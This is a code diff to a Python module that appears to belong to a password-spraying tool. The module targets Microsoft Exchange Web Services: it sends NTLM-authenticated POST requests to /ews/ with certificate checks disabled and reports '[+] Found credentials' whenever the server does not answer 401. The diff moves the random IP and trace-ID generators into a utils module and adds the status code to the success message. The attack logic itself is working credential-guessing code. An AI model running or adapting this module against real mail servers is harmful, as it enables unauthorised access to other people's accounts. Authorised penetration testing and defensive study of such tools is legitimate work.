@@ -1,29 +1,12 @@
-import json, datetime, requests, random
+import datetime, requests
 from requests_ntlm import HttpNtlmAuth
+from utils.utils import generate_ip, generate_id, generate_trace_id
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
-
-def generate_ip():
-
-    return ".".join(str(random.randint(0,255)) for _ in range(4))
-
-
-def generate_id():
-
-    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))
-
-
-def generate_trace_id():
-    str = "Root=1-"
-    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
-    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
-    return str + first + "-" + second
 
 
 def ews_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-
 
     data_response = {
         'timestamp': ts,
@@ -57,14 +40,13 @@ def ews_authenticate(url, username, password, useragent, pluginargs):
         "Content-Type": "text/xml"
     }
 
-
     try:
 
         resp = requests.post("{}/ews/".format(url), headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
 
         if resp.status_code != 401:
             data_response['success'] = True
-            data_response['output'] = f"[+] Found credentials: {username}:{password}"
+            data_response['output'] = f"[+] Found credentials, code: {resp.status_code}: {username}:{password}"
 
         else:
             data_response['success'] = False
